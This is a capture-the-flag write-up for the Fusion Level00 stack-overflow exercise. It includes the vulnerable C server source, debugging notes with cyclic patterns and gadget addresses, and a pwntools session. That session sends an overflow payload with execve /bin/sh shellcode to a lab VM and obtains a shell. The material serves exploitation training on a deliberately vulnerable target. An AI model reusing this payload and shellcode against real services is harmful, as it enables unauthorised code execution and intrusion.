### challenge
```txt
Fusion Level00
About
This is a simple introduction to get you warmed up. The return address is supplied in case your memory needs a jog :)

Hint: Storing your shellcode inside of the fix_path ‘resolved’ buffer might be a bad idea due to character restrictions due to realpath(). Instead, there is plenty of room after the HTTP/1.1 that you can use that will be ideal (and much larger).

Vulnerability Type	Stack
Position Independent Executable	No
Read only relocations	No
Non-Executable stack	No
Non-Executable heap	No
Address Space Layout Randomisation	No
Source Fortification	No
```

### level00.c
```c
#include "../common/common.c"    

int fix_path(char *path)
{
  char resolved[128];
  
  if(realpath(path, resolved) == NULL) return 1; // can't access path. will error trying to open
  strcpy(path, resolved);
}

char *parse_http_request()
{
  char buffer[1024];
  char *path;
  char *q;

  printf("[debug] buffer is at 0x%08x :-)\n", buffer);

  if(read(0, buffer, sizeof(buffer)) <= 0) errx(0, "Failed to read from remote host");
  if(memcmp(buffer, "GET ", 4) != 0) errx(0, "Not a GET request");

  path = &buffer[4];
  q = strchr(path, ' ');
  if(! q) errx(0, "No protocol version specified");
  *q++ = 0;
  if(strncmp(q, "HTTP/1.1", 8) != 0) errx(0, "Invalid protocol");

  fix_path(path);

  printf("trying to access %s\n", path);

  return path;
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *p;

  background_process(NAME, UID, GID); 
  fd = serve_forever(PORT);
  set_io(fd);

  parse_http_request(); 
}
```


### debugging
```txt
"""
#pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"
# 0x65413665 # [] 139
# bfca3290
# bfca34b0 = 0x220

0x0804905f : add esp, 0x230 ; pop ebx ; pop edi ; pop ebp ; ret <- works...
0x08049987 : add esp, 0x420 ; pop esi ; pop edi ; pop ebp ; ret

pattern_2 = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"
# 62413062 # [] 31

0x08049f83 : jmp esp

"""
stack_pivot = struct.pack("<I", 0x0804905f)
jmp_esp = struct.pack("<I", 0x08049f83)
crash = "A"*139 + stack_pivot + "C"*(500-139)
second_crash = "B"*31
#shellcode = jmp_esp + "\x90"*24 + "\xcc"*4
shellcode = jmp_esp + "\x90"*24 + '6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80'.decode('hex')

sock.send("GET " + crash + " HTTP/1.1" + second_crash + shellcode)
print sock.recv(1024)
sock.close()

```



### solution
```txt
root@kali:~/CTF# python
Python 2.7.14+ (default, Dec  5 2017, 15:17:02) 
[GCC 7.2.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /root/.pwntools-cache/update to 'never'.
[*] You have the latest version of Pwntools (3.11.0)
>>> 
>>> context.arch = 'i386'
>>> context.terminal = ['tmux']
>>> context.os = 'linux'
>>> context.bits = 32
>>> 
>>> ret_b8 = 0x08048f85 # 0x08048f85 : ret 0xb8
>>> jmp_esp = 0x08049f4f # 0x08049f4f : jmp esp
>>> shellcode = asm(shellcraft.sh())
>>> 
>>> 
>>> shellcode.encode('hex')
'6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80'
>>> 
>>> 
>>> 
>>> p = remote('192.168.85.155', 20000)
[x] Opening connection to 192.168.85.155 on port 20000
[x] Opening connection to 192.168.85.155 on port 20000: Trying 192.168.85.155
[+] Opening connection to 192.168.85.155 on port 20000: Done
>>> stack_pivot = struct.pack("<I", 0x0804905f)
>>> jmp_esp = struct.pack("<I", 0x08049f83)
>>> crash = "A"*139 + stack_pivot + "C"*(500-139)
>>> second_crash = "B"*31
>>> #shellcode = jmp_esp + "\x90"*24 + "\xcc"*4
... shellcode = jmp_esp + "\x90"*24 + '6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80'.decode('hex')
>>> p.send("GET " + crash + " HTTP/1.1" + second_crash +shellcode)
>>> p.interactive()
[*] Switching to interactive mode
[debug] buffer is at 0xbfca32a8 :-)
id
uid=20000 gid=20000 groups=20000
exit
[*] Got EOF while reading in interactive
^C[*] Interrupted
>>> 
[1]+  Stopped                 python
```